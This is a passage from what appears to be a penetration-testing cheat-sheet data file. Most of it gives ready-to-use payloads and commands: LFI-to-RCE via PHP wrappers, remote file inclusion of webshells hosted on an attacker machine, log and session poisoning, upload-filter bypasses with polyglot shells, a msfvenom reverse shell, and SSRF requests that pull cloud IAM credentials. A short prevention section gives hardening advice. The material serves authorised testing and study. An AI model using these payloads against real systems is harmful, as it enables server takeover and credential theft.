              { id: 'lfi-b6', label: 'Filename prefix bypass (/ trick)', os: 'Both', command: '# When app prepends a string: include("lang_" . $input)\n# Lead with / to make the prefix a directory component:\n$$URL/index.php?language=/../../../etc/passwd\n# Result: include("lang_/../../../etc/passwd") → lang_/ treated as dir name → traversal works', notes: 'Prepend / so the hardcoded prefix becomes a directory name rather than part of the filename. Combine with ../ to reach any path.' },
              { id: 'lfi-b7', label: 'Encoding variations (WAF bypass)', os: 'Both', command: '# Backslash (Windows — IIS treats \\ as path sep):\n..\\..\\..\\Windows\\win.ini\n..%5C..%5C..%5CWindows%5Cwin.ini\n# Extra slashes (Linux ignores multiple slashes):\n////etc/passwd\n# Current-dir dot (Linux ignores /. in path):\n/etc/./passwd\n# Mixed case (case-insensitive file systems):\n..%2F..%2F..%2FEtc%2FPassWd', notes: 'Linux ignores multiple slashes and /./ in paths. WAFs that match ../ literally miss these. Use Burp Decoder to generate encoding variants.' },
            ],
          },
          {
            id: 'lfi-st-phpf',
            name: 'PHP Filters',
            commands: [
              { id: 'lfi-pf1', label: 'Fuzz for PHP files', os: 'Linux', command: 'ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u $$URL/FUZZ.php', notes: 'Scan ALL response codes — 301/302/403 pages are still readable via LFI. After finding files, scan their source for more PHP references to keep expanding coverage.' },
              { id: 'lfi2', label: 'PHP filter — base64 source disclosure', os: 'Both', command: '# Syntax: php://filter/read=<filter>/resource=<file>\n# Omit .php — the app appends the extension automatically\n$$URL/index.php?language=php://filter/read=convert.base64-encode/resource=index\n$$URL/index.php?language=php://filter/read=convert.base64-encode/resource=config\n# Shorthand (without read=) also works:\n$$URL/index.php?language=php://filter/convert.base64-encode/resource=index', notes: 'Returns base64-encoded PHP source instead of executing it — bypasses PHP execution. Works with appended extensions too (omit .php in resource). View page source to copy the full base64 string without truncation.' },
              { id: 'lfi-pf2', label: 'Decode base64 output', os: 'Linux', command: "echo 'PD9waHAK...PASTE_FULL_OUTPUT...' | base64 -d\n# Save to file for easier reading:\necho 'PD9waHAK...' | base64 -d > source.php", notes: 'Copy from page source (Ctrl+U), not the rendered page — rendered view may truncate the string. Decoded source often contains DB credentials, API keys, or references to other PHP files.' },
              { id: 'lfi-pf3', label: 'ROT13 filter (alternate)', os: 'Both', command: '$$URL/index.php?language=php://filter/read=string.rot13/resource=index\n# Decode on attacker:\necho "ROT13_OUTPUT" | tr "A-Za-z" "N-ZA-Mn-za-m"', notes: 'Alternative to base64 — useful if the response filters or escapes base64 output. ROT13 only shifts letters so special chars pass through unmodified.' },
            ],
          },
          {
            id: 'lfi-st-2ord',
            name: 'Second-Order Attacks',
            commands: [
              { id: 'lfi-2o1', label: 'Concept — what is a second-order LFI', os: 'Both', command: '# Pattern:\n# 1. App stores user-controlled value in DB (e.g. username, profile field)\n# 2. Another function later reads that DB value and uses it in include()\n# 3. Poison the stored value with an LFI payload\n# 4. Trigger the feature that reads and includes the stored value\n\n# Example: avatar URL at /profile/$username/avatar.png\n# Set username to: ../../../etc/passwd\n# App fetches:    /profile/../../../etc/passwd/avatar.png → /etc/passwd', notes: 'Developers often sanitize direct user input but trust database values. The attack surface is any feature that pulls a filename/path from storage rather than the current request.' },
              { id: 'lfi-2o2', label: 'Identify second-order injection points', os: 'Both', command: '# Look for features that:\n# - Use profile data (username, display name, avatar) in file paths\n# - Download/serve files based on stored filenames\n# - Template rendering based on stored user preferences\n# - Export or report generation based on stored user input\n\n# Test by setting fields to: ../../../etc/passwd\n# Then trigger the feature that reads those fields', notes: '' },
              { id: 'lfi-2o3', label: 'Register account with LFI payload as username', os: 'Both', command: '# During registration set username to:\n../../../etc/passwd\n# Or URL-encoded:\n..%2F..%2F..%2Fetc%2Fpasswd\n\n# Then trigger the vulnerable feature:\n# - View your profile / avatar\n# - Download your data export\n# - Access a generated report\n# - Any feature that constructs a file path using your username', notes: 'Also try: email field, first/last name, company name, bio — any field the app might use in a file operation.' },
            ],
          },
        ],
      },
      {
        id: 'lfi-rce',
        name: 'Remote Code Execution',
        description: 'Escalate LFI to RCE via PHP wrappers, remote file inclusion, or log poisoning.',
        tags: ['web', 'lfi', 'rce'],
        subtechniques: [
          {
            id: 'lfi-st-phpw',
            name: 'PHP Wrappers',
            commands: [
              { id: 'lfi-pw0', label: 'Check allow_url_include (php.ini)', os: 'Linux', command: '# Apache:\ncurl "$$URL/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"\n# Nginx:\ncurl "$$URL/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/fpm/php.ini"\n# Decode and check:\necho \'B64_OUTPUT\' | base64 -d | grep allow_url_include\necho \'B64_OUTPUT\' | base64 -d | grep expect', notes: 'Required before using data://, php://input, or RFI attacks. Path: /etc/php/X.Y/apache2/php.ini (Apache) or /etc/php/X.Y/fpm/php.ini (Nginx). Try the latest PHP version first, then older ones.' },
              { id: 'lfi-b5', label: 'data:// wrapper (RCE)', os: 'Linux', command: '# Step 1: Base64 encode a PHP webshell:\necho \'<?php system($_GET["cmd"]); ?>\' | base64\n# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\n\n# Step 2: Inject — URL-encode + as %2B and = as %3D:\n$$URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id\n\n# Via curl:\ncurl -s \'$$URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id\' | grep uid\n\n# Plaintext variant (no encoding needed):\n$$URL/index.php?language=data://text/plain,<?php system("id"); ?>', notes: 'Requires allow_url_include=On. Base64 avoids special char issues in URLs. Not enabled by default — verify with php.ini read first.' },
              { id: 'lfi3', label: 'php://input (RCE via POST)', os: 'Linux', command: '# Send PHP webshell as POST body, run command via GET:\ncurl -s -X POST --data \'<?php system($_GET["cmd"]); ?>\' "$$URL/index.php?language=php://input&cmd=id" | grep uid\n\n# If function only accepts POST (no GET cmd param), embed command directly:\ncurl -s -X POST --data \'<?php system("id"); ?>\' "$$URL/index.php?language=php://input"', notes: 'Requires allow_url_include=On. Code is in the POST body — useful when GET is filtered. The vulnerable param must accept POST requests. If only POST is accepted use $_REQUEST or hardcode the command.' },
              { id: 'lfi-pw3', label: 'expect:// wrapper (RCE)', os: 'Linux', command: '# Check if expect extension is loaded (after reading php.ini via filter):\necho \'B64_PHP_INI\' | base64 -d | grep expect\n# "extension=expect" confirms it is configured\n\n# Execute commands directly — no webshell needed:\ncurl -s "$$URL/index.php?language=expect://id" | grep uid\ncurl -s "$$URL/index.php?language=expect://whoami"', notes: 'External wrapper — must be manually installed and enabled. Rarely found but simplest RCE: commands run directly without a webshell. Verify via php.ini before trying.' },
            ],
          },
          {
            id: 'lfi-st-rfi',
            name: 'Remote File Inclusion',
            commands: [
              { id: 'lfi-rfi0', label: 'Verify RFI', os: 'Linux', command: '# Check allow_url_include (decode php.ini via filter first):\necho \'B64_PHP_INI\' | base64 -d | grep allow_url_include\n# allow_url_include = On confirms potential RFI\n\n# Confirm by including a local URL (safe, no external connection needed):\n$$URL/index.php?language=http://127.0.0.1:80/index.php\n\n# Also probe internal services by changing the port (SSRF):\n$$URL/index.php?language=http://127.0.0.1:8080/index.php', notes: 'Even if allow_url_include=On, the function may still reject remote URLs — always test with a local URL first. If 127.0.0.1 works, RFI is confirmed. Avoid including index.php on itself (recursion); use a different page if available.' },
              { id: 'lfi-rfi1', label: 'RFI via HTTP', os: 'Linux', command: '# Step 1: Create the webshell:\necho \'<?php system($_GET["cmd"]); ?>\' > shell.php\n\n# Step 2: Host it (use 443/80 to bypass egress firewalls):\nsudo python3 -m http.server $$LPORT\n\n# Step 3: Include and execute:\ncurl -s "$$URL/index.php?language=http://$$LHOST:$$LPORT/shell.php&cmd=id"\n\n# Or directly in the browser:\n$$URL/index.php?language=http://$$LHOST:$$LPORT/shell.php&cmd=id', notes: 'Requires allow_url_include=On. Watch your HTTP server for GET /shell.php to confirm the file was fetched. Use port 443 or 80 to blend with normal traffic and avoid outbound firewall blocks.' },
              { id: 'lfi-rfi2', label: 'RFI via FTP', os: 'Linux', command: '# Step 1: Create the webshell:\necho \'<?php system($_GET["cmd"]); ?>\' > shell.php\n\n# Step 2: Start FTP server (anonymous auth by default):\nsudo python -m pyftpdlib -p 21\n\n# Step 3: Include via ftp:// URL:\ncurl -s "$$URL/index.php?language=ftp://$$LHOST/shell.php&cmd=id"\n\n# If credentials are required by the server:\ncurl -s "$$URL/index.php?language=ftp://user:pass@$$LHOST/shell.php&cmd=id"', notes: 'Useful when http:// strings are blocked by a WAF or firewall rule. Requires allow_url_include=On. Install pyftpdlib with: pip install pyftpdlib.' },
              { id: 'lfi-rfi3', label: 'RFI via SMB (Windows)', os: 'Windows', command: '# Step 1: Create the webshell:\necho \'<?php system($_GET["cmd"]); ?>\' > shell.php\n\n# Step 2: Spin up an SMB share (anonymous auth, SMB2 support):\nimpacket-smbserver -smb2support share $(pwd)\n\n# Step 3: Include via UNC path:\ncurl -s "$$URL/index.php?language=\\\\\\\\$$LHOST\\\\share\\\\shell.php&cmd=whoami"\n\n# In browser (UNC path):\n$$URL/index.php?language=\\\\$$LHOST\\share\\shell.php&cmd=whoami', notes: 'Windows targets only. Does NOT require allow_url_include=On — Windows natively resolves UNC paths. Works best when attacker is on the same network. The -smb2support flag prevents connection issues with modern Windows versions.' },
            ],
          },
          {
            id: 'lfi-st-upload',
            name: 'LFI + File Upload',
            commands: [
              { id: 'lfi-fu0', label: 'Malicious GIF image (image upload)', os: 'Linux', command: '# Step 1: Create malicious GIF — magic bytes pass image checks, PHP still executes:\necho \'GIF8<?php system($_GET["cmd"]); ?>\' > shell.gif\n\n# Step 2: Upload via the web app (profile image, avatar, etc.)\n\n# Step 3: Find the upload path from page source after upload:\ncurl -s $$URL/settings.php | grep -i "shell.gif"\n# e.g. src="/profile_images/shell.gif"\n\n# Step 4: Include via LFI to execute:\ncurl -s "$$URL/index.php?language=./profile_images/shell.gif&cmd=id"', notes: 'GIF8 magic bytes let the file pass basic image-type checks while the PHP trailer still executes. Works with include/require. If the upload path is unknown, check the HTML source after upload or fuzz common directories (uploads/, profile_images/, avatars/).' },
              { id: 'lfi-fu1', label: 'Malicious zip upload (zip:// wrapper)', os: 'Linux', command: '# Step 1: Create a PHP shell and zip it — rename to .jpg to bypass upload filters:\necho \'<?php system($_GET["cmd"]); ?>\' > shell.php\nzip shell.jpg shell.php\n\n# Step 2: Upload shell.jpg via the web app\n\n# Step 3: Include via zip:// — %23 is URL-encoded # to reference a file inside the archive:\ncurl -s "$$URL/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"\n\n# In browser:\n$$URL/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id', notes: 'zip:// is not enabled by default — confirm availability first. Rename the archive to an allowed extension (.jpg, .png) to bypass upload filters. %23 is URL-encoded # for referencing files inside the zip.' },
              { id: 'lfi-fu2', label: 'Malicious phar upload (phar:// wrapper)', os: 'Linux', command: '# Step 1: Write the phar generator script:\ncat > shell.php << \'EOF\'\n<?php\n$phar = new Phar(\'shell.phar\');\n$phar->startBuffering();\n$phar->addFromString(\'shell.txt\', \'<?php system($_GET["cmd"]); ?>\');\n$phar->setStub(\'<?php __HALT_COMPILER(); ?>\');\n$phar->stopBuffering();\nEOF\n\n# Step 2: Compile (phar.readonly must be 0) and rename as .jpg:\nphp --define phar.readonly=0 shell.php && mv shell.phar shell.jpg\n\n# Step 3: Upload shell.jpg via the web app\n\n# Step 4: Include via phar:// — %2F is URL-encoded / to reference internal file:\ncurl -s "$$URL/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"', notes: 'phar.readonly=0 is required to compile the phar archive. The phar:// wrapper uses %2F (URL-encoded /) to reference internal files. Use this when zip:// is unavailable. Both zip and phar methods are considered unreliable — prefer the GIF image method when possible.' },
            ],
          },
          {
            id: 'lfi-st-log',
            name: 'Log Poisoning',
            commands: [
              { id: 'lfi-lp0', label: 'PHP session poisoning', os: 'Linux', command: '# Step 1: Get your PHPSESSID cookie value from browser or curl:\ncurl -s $$URL/ -v 2>&1 | grep -i "set-cookie.*PHPSESSID"\n\n# Step 2: Read the session file to confirm you control a stored value:\n$$URL/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>\n# Windows path: C:\\Windows\\Temp\\sess_<PHPSESSID>\n\n# Step 3: Poison the language parameter with a URL-encoded PHP webshell:\n$$URL/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E\n\n# Step 4: Include the session file and execute:\ncurl -s "$$URL/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id"', notes: 'The language parameter value is stored verbatim in the session file. URL-encoding the PHP payload avoids browser/filter issues. Important: every subsequent page request overwrites the session — re-poison before each new command.' },
              { id: 'lfi4', label: 'Server log poisoning (Apache / Nginx)', os: 'Linux', command: '# Step 1: Verify you can read the log file:\ncurl -s "$$URL/index.php?language=/var/log/apache2/access.log"\n# Nginx Linux: /var/log/nginx/access.log\n# Apache Windows: C:\\\\xampp\\\\apache\\\\logs\\\\access.log\n# Nginx Windows:  C:\\\\nginx\\\\log\\\\access.log\n\n# Step 2a: Poison User-Agent via curl -A:\ncurl -s -A "<?php system(\\$_GET[\'cmd\']); ?>" $$URL\n\n# Step 2b: Poison via curl -H with a payload file (avoids shell escaping):\necho -n \'User-Agent: <?php system($_GET["cmd"]); ?>\' > Poison\ncurl -s $$URL/index.php -H @Poison\n\n# Step 3: Include the log and execute:\ncurl -s "$$URL/index.php?language=/var/log/apache2/access.log&cmd=id"', notes: 'Any request to the server gets logged — poison any endpoint, not just the LFI page. Logs can be large and slow; if the page hangs use Burp Repeater with a timeout. Nginx access logs work identically with a different path.' },
              { id: 'lfi5', label: 'Log poisoning — /proc/self/environ & fd', os: 'Linux', command: '# /proc/self/environ holds current process env vars including HTTP headers:\n# Step 1: Poison via User-Agent:\ncurl -s -A "<?php system(\\$_GET[\'cmd\']); ?>" $$URL\n# Step 2: Include environ and execute:\ncurl -s "$$URL/index.php?language=/proc/self/environ&cmd=id"\n\n# /proc/self/fd/N — open file descriptors (often point to access/error logs):\n# Brute-force fd index to find one that holds a log:\nfor i in $(seq 0 25); do curl -s "$$URL/index.php?language=/proc/self/fd/$i" | grep -qi "GET /" && echo "Hit: fd=$i" && break; done', notes: 'Requires PHP process read permission on /proc/self/environ — often restricted. The fd/ entries can reference the same access.log/error.log even when the standard log path is unknown or locked down. Typical useful range is fd/0 to fd/25.' },
              { id: 'lfi5b', label: 'Log poisoning — SSH / mail / FTP logs', os: 'Linux', command: '# SSH auth log — username is logged verbatim on failed login:\nssh "<?php system(\\$_GET[\'cmd\']); ?>"@$$IP\ncurl -s "$$URL/index.php?language=/var/log/auth.log&cmd=id"\n# Also try: /var/log/sshd.log  |  /var/log/secure (RHEL/CentOS)\n\n# vsftpd log — username logged on failed FTP login:\n# Connect and enter PHP as the username:\nftp $$IP\n# Username: <?php system($_GET["cmd"]); ?>\ncurl -s "$$URL/index.php?language=/var/log/vsftpd.log&cmd=id"\n\n# Mail log — PHP in sender/subject field:\ncurl -s "$$URL/index.php?language=/var/log/mail"', notes: 'Always try to read the log via LFI first before poisoning. SSH and vsftpd log the username from failed logins. Mail logs record sender headers. Paths: /var/log/auth.log (Debian/Ubuntu) vs /var/log/secure (RHEL/CentOS).' },
            ],
          },
        ],
      },
      {
        id: 'lfi-auto',
        name: 'Automation & Prevention',
        description: 'Automate LFI discovery and understand how to prevent file inclusion vulnerabilities.',
        tags: ['web', 'lfi', 'automation'],
        subtechniques: [
          {
            id: 'lfi-st-scan',
            name: 'Automated Scanning',
            commands: [
              { id: 'lfi-as0', label: 'Fuzz for vulnerable GET parameter', os: 'Linux', command: '# Discover hidden/unlisted GET parameters on the target page:\nffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \\\n  -u "$$URL/index.php?FUZZ=value" \\\n  -fs <BASELINE_SIZE>\n\n# Tip: get baseline size first:\ncurl -s "$$URL/index.php" | wc -c\n\n# Narrow to top 25 LFI-prone params (faster):\n# language, page, file, path, dir, module, template, view, doc, include...', notes: 'Forms are usually tested; hidden/unlisted GET params are not. Use burp-parameter-names.txt from SecLists. -fs filters out the default page size (false positives). For a quicker check, manually try the top 25 LFI params from HackTricks.' },
              { id: 'lfi6', label: 'Fuzz LFI payloads (LFI-Jhaddix.txt)', os: 'Linux', command: '# Once the vulnerable parameter is known, fuzz its value with LFI payloads:\nffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \\\n  -u "$$URL/index.php?language=FUZZ" \\\n  -fs <BASELINE_SIZE>\n\n# Get baseline size:\ncurl -s "$$URL/index.php?language=test" | wc -c', notes: 'LFI-Jhaddix.txt covers hundreds of traversal payloads including URL-encoded, double-encoded, and null-byte variants for both Linux and Windows. Filter false positives with -fs (response size) rather than -mc to catch 200 responses that are just the default page.' },
              { id: 'lfi-as2', label: 'Fuzz server webroot path', os: 'Linux', command: '# Discover the full webroot path (needed for relative includes, zip://, etc.):\n# Linux:\nffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \\\n  -u "$$URL/index.php?language=../../../../FUZZ/index.php" \\\n  -fs <BASELINE_SIZE>\n\n# Windows:\nffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt:FUZZ \\\n  -u "$$URL/index.php?language=../../../../FUZZ/index.php" \\\n  -fs <BASELINE_SIZE>', notes: 'Returns the webroot path (e.g. /var/www/html/) — needed when constructing relative paths to uploaded files or chaining with other techniques. The payload navigates up 4 levels and then back into the FUZZ webroot to confirm index.php exists there.' },
              { id: 'lfi-as3', label: 'Fuzz server logs & config files', os: 'Linux', command: '# Fuzz for readable log and config file paths:\n# Linux (DragonJAR wordlist — broader than LFI-Jhaddix):\nffuf -w ./LFI-WordList-Linux:FUZZ \\\n  -u "$$URL/index.php?language=../../../../FUZZ" \\\n  -fs <BASELINE_SIZE>\n\n# Windows:\nffuf -w ./LFI-WordList-Windows:FUZZ \\\n  -u "$$URL/index.php?language=../../../../FUZZ" \\\n  -fs <BASELINE_SIZE>\n\n# Follow up: read apache2.conf to find log variable:\ncurl -s "$$URL/index.php?language=../../../../etc/apache2/apache2.conf" | grep -i "log\|root"\n# Then resolve APACHE_LOG_DIR:\ncurl -s "$$URL/index.php?language=../../../../etc/apache2/envvars" | grep APACHE_LOG_DIR', notes: 'LFI-WordList-Linux/Windows from DragonJAR returns 60+ results vs the ~10 from LFI-Jhaddix. apache2.conf reveals the log dir variable (APACHE_LOG_DIR), and envvars resolves it to the real path (e.g. /var/log/apache2). Download wordlists from: github.com/DragonJAR/Security-Wordlist.' },
            ],
          },
          {
            id: 'lfi-st-prev',
            name: 'Prevention',
            commands: [
              { id: 'lfi-pv0', label: 'Safe include: whitelist approach (PHP)', os: 'Both', command: '// VULNERABLE — user input goes directly into include:\ninclude($_GET[\'language\']);\n\n// SAFE — match input against a fixed allowlist:\n$allowed = [\'en\', \'es\', \'fr\'];\nif (in_array($_GET[\'language\'], $allowed)) {\n    include(\'./languages/\' . $_GET[\'language\'] . \'.php\');\n} else {\n    include(\'./languages/en.php\'); // safe fallback\n}\n\n// Minimum fix without a full rewrite:\ninclude(\'./languages/\' . basename($_GET[\'language\']));', notes: 'Most effective mitigation — user input never touches the include path directly. If a full rewrite is not feasible, prefix with a hardcoded directory and wrap with basename() to at minimum strip traversal components.' },
              { id: 'lfi-pv1', label: 'Sanitize directory traversal (PHP)', os: 'Both', command: '// basename() strips everything up to the last /:\n// "../../../../etc/passwd" → "passwd"\n$input = basename($_GET[\'language\']);\ninclude(\'./languages/\' . $input);\n\n// Recursive str_replace to strip ../ sequences:\n// (catches ....// → ../ after first pass)\nwhile (substr_count($input, \'../\')) {\n    $input = str_replace(\'../\', \'\', $input);\n}\n\n// Warning — edge cases bypass naive filters:\n// cat .?/.*/.?/etc/passwd\n// Always combine with a hardcoded directory prefix', notes: 'basename() is the safest built-in. The recursive strip catches doubled sequences like ....// that survive a single replace. Rolling your own filter risks missing edge cases — combine both and use a hardcoded directory prefix.' },
              { id: 'lfi-pv2', label: 'php.ini hardening', os: 'Linux', command: '# Find the active php.ini:\nphp --ini | grep "Loaded Configuration"\n# Common paths: /etc/php/X.Y/apache2/php.ini  |  /etc/php/X.Y/fpm/php.ini\n\n# Key settings — add or uncomment in php.ini:\nallow_url_fopen   = Off        ; blocks file_get_contents() on remote URLs\nallow_url_include = Off        ; blocks data://, php://input, RFI\nopen_basedir      = /var/www   ; prevents reads outside the webroot\ndisable_functions = system,exec,shell_exec,passthru,popen,proc_open,expect\n\n# Disable the expect wrapper (comment out in php.ini):\n; extension=expect\n\n# Apply changes:\nsudo systemctl restart apache2   # or: sudo systemctl restart php8.1-fpm', notes: 'allow_url_include=Off blocks PHP wrapper RCE (data://, php://input) and RFI in one setting. open_basedir stops traversal from reaching files outside /var/www even if a path escapes. disable_functions is a last-resort backstop if code execution still occurs.' },
              { id: 'lfi-pv3', label: 'WAF — ModSecurity (Apache)', os: 'Linux', command: '# Install ModSecurity and OWASP Core Rule Set:\nsudo apt install libapache2-mod-security2\nsudo a2enmod security2\n\n# Create active config from template:\nsudo cp /etc/modsecurity/modsecurity.conf-recommended \\\n        /etc/modsecurity/modsecurity.conf\n\n# Switch from detection-only to enforcement:\nsudo sed -i \'s/SecRuleEngine DetectionOnly/SecRuleEngine On/\' \\\n        /etc/modsecurity/modsecurity.conf\n\n# Restart Apache:\nsudo systemctl restart apache2\n\n# Verify WAF is blocking traversal:\ncurl -v "$$URL/index.php?language=../../../../etc/passwd"\n# Expect: 403 Forbidden', notes: 'Start in DetectionOnly mode first — review /var/log/apache2/modsec_audit.log for false positives before switching to On. ModSecurity + OWASP CRS catches most LFI/traversal patterns. WAF is defense-in-depth, not a substitute for fixing the underlying code.' },
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'web-upload',
    name: 'File Upload Bypass',
    icon: '📤',
    techniques: [
      {
        id: 'upl-ext',
        name: 'Extension & MIME Bypass',
        commands: [
          { id: 'upl1', label: 'Extension bypass list', os: 'Both', command: 'shell.php\nshell.PHP\nshell.php5\nshell.php7\nshell.phtml\nshell.pHp\nshell.PhP\nshell.php.jpg\nshell.jpg.php\nshell.php%00.jpg', notes: 'Try each — server may execute based on double extension or case-insensitive mapping.' },
          { id: 'upl2', label: 'Content-Type bypass', os: 'Both', command: '# Intercept in Burp, change:\nContent-Type: image/jpeg\n\n# Minimal PHP shell:\n<?php system($_GET["cmd"]); ?>', notes: 'Server-side filter may only check Content-Type header, not actual content.' },
          { id: 'upl-e1', label: 'Blacklist bypass extensions', os: 'Both', command: 'shell.php3\nshell.php4\nshell.phar\nshell.shtml\nshell.cgi\nshell.pl\nshell.py\nshell.asp\nshell.aspx\nshell.jsp', notes: 'Try alternate execution-capable extensions when .php is specifically blocked.' },
          { id: 'upl-e2', label: 'Double extension bypass', os: 'Both', command: 'shell.jpg.php\nshell.php.jpg\nshell.php.png\nshell.php7.jpg', notes: 'Server may extract last extension, or first — test both orderings.' },
        ],
      },
      {
        id: 'upl-magic',
        name: 'Magic Bytes & Polyglots',
        commands: [
          { id: 'upl3', label: 'Magic bytes bypass', os: 'Linux', command: "echo -e 'GIF89a\\n<?php system($_GET[\"cmd\"]); ?>' > shell.php.gif\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.php.jpg", notes: 'GIF89a passes image MIME check. exiftool injects PHP into image metadata.' },
          { id: 'upl-m1', label: 'JPEG magic bytes prepend', os: 'Linux', command: "printf '\\xFF\\xD8\\xFF<?php system($_GET[\"cmd\"]); ?>' > shell.php", notes: 'JPEG magic: FF D8 FF. Server checks magic bytes; rest is PHP.' },
          { id: 'upl-m2', label: 'PNG polyglot', os: 'Linux', command: "python3 -c \"\nimport struct,zlib\ndata=b'\\x89PNG\\r\\n\\x1a\\n'+b'<?php system(\\$_GET[\\\"cmd\\\"]); ?>'\nopen('shell.php','wb').write(data)\"", notes: 'PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A. Polyglot is valid PNG header + PHP code.' },
        ],
      },
      {
        id: 'upl-server',
        name: 'Server Config Abuse',
        commands: [
          { id: 'upl4', label: '.htaccess override (Apache)', os: 'Linux', command: '# Upload .htaccess first:\nAddType application/x-httpd-php .jpg\n# Then upload shell.jpg containing PHP code', notes: 'Only works if .htaccess uploads are permitted and server is Apache.' },
          { id: 'upl-s1', label: 'web.config (IIS)', os: 'Both', command: '# Upload web.config to uploads dir:\n<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n  <system.webServer>\n    <handlers>\n      <add name="shell" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="C:\\Windows\\System32\\cmd.exe" resourceType="Unspecified" />\n    </handlers>\n  </system.webServer>\n</configuration>', notes: 'IIS equivalent of .htaccess. Maps .jpg to cmd.exe execution.' },
          { id: 'upl-s2', label: 'SVG upload (XSS vector)', os: 'Both', command: '<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<svg xmlns="http://www.w3.org/2000/svg">\n  <text>&xxe;</text>\n</svg>', notes: 'If server renders SVG inline → XXE. If reflected in browser → Stored XSS.' },
        ],
      },
      {
        id: 'upl-shell',
        name: 'Shells & Post-Exploit',
        commands: [
          { id: 'upl-sh1', label: 'Minimal PHP webshell', os: 'Both', command: '<?php system($_GET["cmd"]); ?>', notes: 'Smallest functional PHP shell. Access: $$URL/uploads/shell.php?cmd=id' },
          { id: 'upl-sh2', label: 'PHP reverse shell', os: 'Linux', command: "# msfvenom:\nmsfvenom -p php/reverse_php LHOST=$$LHOST LPORT=$$LPORT -f raw > shell.php\n# Or use: /usr/share/webshells/php/php-reverse-shell.php", notes: 'Edit LHOST and LPORT. Catch with: nc -lvnp $$LPORT' },
          { id: 'upl5', label: 'Weevely shell', os: 'Linux', command: 'weevely generate $$PASSWORD shell.php\n# After upload:\nweevely $$URL/uploads/shell.php $$PASSWORD', notes: 'Obfuscated PHP shell with built-in post-exploit toolkit.' },
          { id: 'upl-sh3', label: 'Verify upload path', os: 'Linux', command: "ffuf -u $$URL/FUZZ/shell.php -w $$WORDLIST -mc 200", notes: 'Brute-force the upload directory if location is not visible. Common: /uploads/, /files/, /media/, /images/.' },
        ],
      },
    ],
  },
  {
    id: 'web-ssrf',
    name: 'Server-Side Request Forgery',
    icon: '🔗',
    techniques: [
      {
        id: 'ssrf-int',
        name: 'Internal & Cloud Metadata',
        commands: [
          { id: "ssrf1", label: "Basic internal access", os: "Both", command: "http://127.0.0.1/admin\nhttp://localhost/admin\nhttp://0.0.0.0/admin\nhttp://[::1]/admin\nhttp://10.0.0.1/\nhttp://192.168.1.1/", notes: "Inject into any URL parameter the server fetches." },
          { id: "ssrf2", label: "AWS metadata", os: "Both", command: "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data/", notes: "Leaks IAM role credentials on AWS EC2." },
          { id: "ssrf3", label: "Azure metadata", os: "Both", command: "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Required header: Metadata: true", notes: "" },
          { id: "ssrf4", label: "GCP metadata", os: "Both", command: "http://metadata.google.internal/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n# Required header: Metadata-Flavor: Google", notes: "" },
        ],
      },
      {
        id: 'ssrf-byp',
        name: 'Filter Bypass',
        commands: [
          { id: "ssrf5", label: "IP encoding bypass", os: "Both", command: "http://2130706433/        (127.0.0.1 decimal)\nhttp://0x7f000001/        (127.0.0.1 hex)\nhttp://0177.0.0.1/        (127.0.0.1 octal)\nhttp://127.1/\nhttp://127.0.0.1.nip.io/", notes: "Use when 127.0.0.1 and localhost are blocked by string matching." },
          { id: "ssrf-b1", label: "Domain redirect bypass", os: "Both", command: "http://attacker.com/redirect → http://127.0.0.1/admin\n# Or use: http://localtest.me → 127.0.0.1", notes: "Server follows the redirect to the internal address, bypassing the hostname check." },
          { id: "ssrf-b2", label: "URL scheme bypass", os: "Both", command: "file:///etc/passwd\nfile:///c:/windows/win.ini\ndict://127.0.0.1:6379/INFO\ngopher://127.0.0.1:25/_EHLO%20localhost", notes: "file:// reads local files. dict:// and gopher:// can interact with internal services (Redis, SMTP)." },
          { id: "ssrf-b3", label: "HTTPS to HTTP bypass", os: "Both", command: "https://127.0.0.1/admin\nhttps://169.254.169.254/latest/meta-data/", notes: "Some filters only block http:// and miss https://." },
        ],
      },
      {
        id: 'ssrf-blind',
        name: 'Blind SSRF',
        commands: [
          { id: "ssrf6", label: "interactsh callback", os: "Linux", command: "interactsh-client\n# Inject as SSRF target:\nhttp://YOUR-ID.oast.fun/", notes: "Detects blind SSRF via DNS/HTTP callbacks. No impact visible in response." },
          { id: "ssrf-bl1", label: "Burp Collaborator", os: "Both", command: "# Use Burp's built-in Collaborator:\n# Burp → Collaborator → Copy to clipboard\n# Inject URL as SSRF target", notes: "Catches DNS and HTTP interactions — confirms SSRF without visible output." },
          { id: "ssrf-bl2", label: "Port scan via SSRF", os: "Both", command: "http://127.0.0.1:22\nhttp://127.0.0.1:3306\nhttp://127.0.0.1:6379\nhttp://127.0.0.1:8080\nhttp://127.0.0.1:9200", notes: "Infer open ports from response time or error messages. Time differences confirm live ports." },
